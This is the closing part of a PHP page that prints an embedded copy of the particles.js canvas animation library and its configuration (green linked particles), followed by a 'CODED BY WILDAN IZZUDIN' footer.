            if (missing_particles < 0) pJS.fn.modes.pushParticles(Math.abs(missing_particles));
            else pJS.fn.modes.removeParticles(missing_particles)
        }
    };
    pJS.fn.vendors.checkOverlap = function(p1, position) {
        for (var i = 0; i < pJS.particles.array.length; i++) {
            var p2 = pJS.particles.array[i];
            var dx = p1.x - p2.x,
                dy = p1.y - p2.y,
                dist = Math.sqrt(dx * dx + dy * dy);
            if (dist <= p1.radius + p2.radius) {
                p1.x = position ? position.x : Math.random() * pJS.canvas.w;
                p1.y = position ? position.y : Math.random() * pJS.canvas.h;
                pJS.fn.vendors.checkOverlap(p1)
            }
        }
    };
    pJS.fn.vendors.createSvgImg = function(p) {
        var svgXml = pJS.tmp.source_svg,
            rgbHex = /#([0-9A-F]{3,6})/gi,
            coloredSvgXml = svgXml.replace(rgbHex, function(m, r, g, b) {
                if (p.color.rgb) {
                    var color_value = \'rgba(\' + p.color.rgb.r + \',\' + p.color.rgb.g + \',\' + p.color.rgb.b + \',\' + p.opacity + \')\'
                } else {
                    var color_value = \'hsla(\' + p.color.hsl.h + \',\' + p.color.hsl.s + \'%,\' + p.color.hsl.l + \'%,\' + p.opacity + \')\'
                }
                return color_value
            });
        var svg = new Blob([coloredSvgXml], {
                type: \'image/svg+xml;charset=utf-8\'
            }),
            DOMURL = window.URL || window.webkitURL || window,
            url = DOMURL.createObjectURL(svg);
        var img = new Image();
        img.addEventListener(\'load\', function() {
            p.img.obj = img;
            p.img.loaded = !0;
            DOMURL.revokeObjectURL(url);
            pJS.tmp.count_svg++
        });
        img.src = url
    };
    pJS.fn.vendors.destroypJS = function() {
        cancelAnimationFrame(pJS.fn.drawAnimFrame);
        canvas_el.remove();
        pJSDom = null
    };
    pJS.fn.vendors.drawShape = function(c, startX, startY, sideLength, sideCountNumerator, sideCountDenominator) {
        var sideCount = sideCountNumerator * sideCountDenominator;
        var decimalSides = sideCountNumerator / sideCountDenominator;
        var interiorAngleDegrees = (180 * (decimalSides - 2)) / decimalSides;
        var interiorAngle = Math.PI - Math.PI * interiorAngleDegrees / 180;
        c.save();
        c.beginPath();
        c.translate(startX, startY);
        c.moveTo(0, 0);
        for (var i = 0; i < sideCount; i++) {
            c.lineTo(sideLength, 0);
            c.translate(sideLength, 0);
            c.rotate(interiorAngle)
        }
        c.fill();
        c.restore()
    };
    pJS.fn.vendors.exportImg = function() {
        window.open(pJS.canvas.el.toDataURL(\'image/png\'), \'_blank\')
    };
    pJS.fn.vendors.loadImg = function(type) {
        pJS.tmp.img_error = undefined;
        if (pJS.particles.shape.image.src != \'\') {
            if (type == \'svg\') {
                var xhr = new XMLHttpRequest();
                xhr.open(\'GET\', pJS.particles.shape.image.src);
                xhr.onreadystatechange = function(data) {
                    if (xhr.readyState == 4) {
                        if (xhr.status == 200) {
                            pJS.tmp.source_svg = data.currentTarget.response;
                            pJS.fn.vendors.checkBeforeDraw()
                        } else {
                            console.log(\'Error pJS - Image not found\');
                            pJS.tmp.img_error = !0
                        }
                    }
                }
                xhr.send()
            } else {
                var img = new Image();
                img.addEventListener(\'load\', function() {
                    pJS.tmp.img_obj = img;
                    pJS.fn.vendors.checkBeforeDraw()
                });
                img.src = pJS.particles.shape.image.src
            }
        } else {
            console.log(\'Error pJS - No image.src\');
            pJS.tmp.img_error = !0
        }
    };
    pJS.fn.vendors.draw = function() {
        if (pJS.particles.shape.type == \'image\') {
            if (pJS.tmp.img_type == \'svg\') {
                if (pJS.tmp.count_svg >= pJS.particles.number.value) {
                    pJS.fn.particlesDraw();
                    if (!pJS.particles.move.enable) cancelRequestAnimFrame(pJS.fn.drawAnimFrame);
                    else pJS.fn.drawAnimFrame = requestAnimFrame(pJS.fn.vendors.draw)
                } else {
                    if (!pJS.tmp.img_error) pJS.fn.drawAnimFrame = requestAnimFrame(pJS.fn.vendors.draw)
                }
            } else {
                if (pJS.tmp.img_obj != undefined) {
                    pJS.fn.particlesDraw();
                    if (!pJS.particles.move.enable) cancelRequestAnimFrame(pJS.fn.drawAnimFrame);
                    else pJS.fn.drawAnimFrame = requestAnimFrame(pJS.fn.vendors.draw)
                } else {
                    if (!pJS.tmp.img_error) pJS.fn.drawAnimFrame = requestAnimFrame(pJS.fn.vendors.draw)
                }
            }
        } else {
            pJS.fn.particlesDraw();
            if (!pJS.particles.move.enable) cancelRequestAnimFrame(pJS.fn.drawAnimFrame);
            else pJS.fn.drawAnimFrame = requestAnimFrame(pJS.fn.vendors.draw)
        }
    };
    pJS.fn.vendors.checkBeforeDraw = function() {
        if (pJS.particles.shape.type == \'image\') {
            if (pJS.tmp.img_type == \'svg\' && pJS.tmp.source_svg == undefined) {
                pJS.tmp.checkAnimFrame = requestAnimFrame(check)
            } else {
                cancelRequestAnimFrame(pJS.tmp.checkAnimFrame);
                if (!pJS.tmp.img_error) {
                    pJS.fn.vendors.init();
                    pJS.fn.vendors.draw()
                }
            }
        } else {
            pJS.fn.vendors.init();
            pJS.fn.vendors.draw()
        }
    };
    pJS.fn.vendors.init = function() {
        pJS.fn.retinaInit();
        pJS.fn.canvasInit();
        pJS.fn.canvasSize();
        pJS.fn.canvasPaint();
        pJS.fn.particlesCreate();
        pJS.fn.vendors.densityAutoParticles();
        pJS.particles.line_linked.color_rgb_line = hexToRgb(pJS.particles.line_linked.color)
    };
    pJS.fn.vendors.start = function() {
        if (isInArray(\'image\', pJS.particles.shape.type)) {
            pJS.tmp.img_type = pJS.particles.shape.image.src.substr(pJS.particles.shape.image.src.length - 3);
            pJS.fn.vendors.loadImg(pJS.tmp.img_type)
        } else {
            pJS.fn.vendors.checkBeforeDraw()
        }
    };
    pJS.fn.vendors.eventsListeners();
    pJS.fn.vendors.start()
};
Object.deepExtend = function(destination, source) {
    for (var property in source) {
        if (source[property] && source[property].constructor && source[property].constructor === Object) {
            destination[property] = destination[property] || {};
            arguments.callee(destination[property], source[property])
        } else {
            destination[property] = source[property]
        }
    }
    return destination
};
window.requestAnimFrame = (function() {
    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) {
        window.setTimeout(callback, 1000 / 60)
    }
})();
window.cancelRequestAnimFrame = (function() {
    return window.cancelAnimationFrame || window.webkitCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.msCancelRequestAnimationFrame || clearTimeout
})();

function hexToRgb(hex) {
    var shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
    hex = hex.replace(shorthandRegex, function(m, r, g, b) {
        return r + r + g + g + b + b
    });
    var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
    return result ? {
        r: parseInt(result[1], 16),
        g: parseInt(result[2], 16),
        b: parseInt(result[3], 16)
    } : null
};

function clamp(number, min, max) {
    return Math.min(Math.max(number, min), max)
};

function isInArray(value, array) {
    return array.indexOf(value) > -1
}
window.pJSDom = [];
window.particlesJS = function(tag_id, params) {
    if (typeof(tag_id) != \'string\') {
        params = tag_id;
        tag_id = \'particles-js\'
    }
    if (!tag_id) {
        tag_id = \'particles-js\'
    }
    var pJS_tag = document.getElementById(tag_id),
        pJS_canvas_class = \'particles-js-canvas-el\',
        exist_canvas = pJS_tag.getElementsByClassName(pJS_canvas_class);
    if (exist_canvas.length) {
        while (exist_canvas.length > 0) {
            pJS_tag.removeChild(exist_canvas[0])
        }
    }
    var canvas_el = document.createElement(\'canvas\');
    canvas_el.className = pJS_canvas_class;
    canvas_el.style.width = "100%";
    canvas_el.style.height = "100%";
    var canvas = document.getElementById(tag_id).appendChild(canvas_el);
    if (canvas != null) {
        pJSDom.push(new pJS(tag_id, params))
    }
};
window.particlesJS.load = function(tag_id, path_config_json, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open(\'GET\', path_config_json);
    xhr.onreadystatechange = function(data) {
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                var params = JSON.parse(data.currentTarget.response);
                window.particlesJS(tag_id, params);
                if (callback) callback()
            } else {
                console.log(\'Error pJS - XMLHttpRequest status: \' + xhr.status);
                console.log(\'Error pJS - File config not found\')
            }
        }
    };
    xhr.send()
} </script>';
    
print '<script type="text/javascript">
particlesJS(\'particles-js\',
  
  {
    "particles": {
    "number": {
        "value": 80,
        "density": {
          "enable": true,
          "value_area": 800
        }
      },
      "color": {
        "value": "#1D9D73"
      },
      "shape": {
        "type": "circle",
        "stroke": {
          "width": 0,
          "color": "#000000"
        },
        "polygon": {
          "nb_sides": 5
        },
        "image": {
          "src": "img/github.svg",
          "width": 100,
          "height": 100
        }
      },
      "opacity": {
        "value": 0.5,
        "random": false,
        "anim": {
          "enable": false,
          "speed": 1,
          "opacity_min": 0.1,
          "sync": false
        }
      },
      "size": {
        "value": 5,
        "random": true,
        "anim": {
          "enable": false,
          "speed": 40,
          "size_min": 0.1,
          "sync": false
        }
      },
      "line_linked": {
        "enable": true,
        "distance": 150,
        "color": "#1D9D73",
        "opacity": 0.4,
        "width": 1
      },
      "move": {
        "enable": true,
        "speed": 6,
        "direction": "none",
        "random": false,
        "straight": false,
        "out_mode": "out",
        "attract": {
          "enable": false,
          "rotateX": 600,
          "rotateY": 1200
        }
      }
    },
    "interactivity": {
      "detect_on": "canvas",
      "events": {
        "onhover": {
          "enable": false,
          "mode": "repulse"
        },
        "onclick": {
          "enable": false,
          "mode": "push"
        },
        "resize": true
      },
      "modes": {
        "grab": {
          "distance": 400,
          "line_linked": {
            "opacity": 1
          }
        },
        "bubble": {
          "distance": 400,
          "size": 40,
          "duration": 2,
          "opacity": 8,
          "speed": 3
        },
        "repulse": {
          "distance": 200
        },
        "push": {
          "particles_nb": 4
        },
        "remove": {
          "particles_nb": 2
        }
      }
    },
    "retina_detect": true,
    "config_demo": {
      "hide_card": false,
      "background_color": "#b61924",
      "background_image": "",
      "background_position": "50% 50%",
      "background_repeat": "no-repeat",
      "background_size": "cover"
    }
  }); </script>
</div>
	</div>
		</div>
<div class="footer">CODED BY WILDAN IZZUDIN</div>';
?>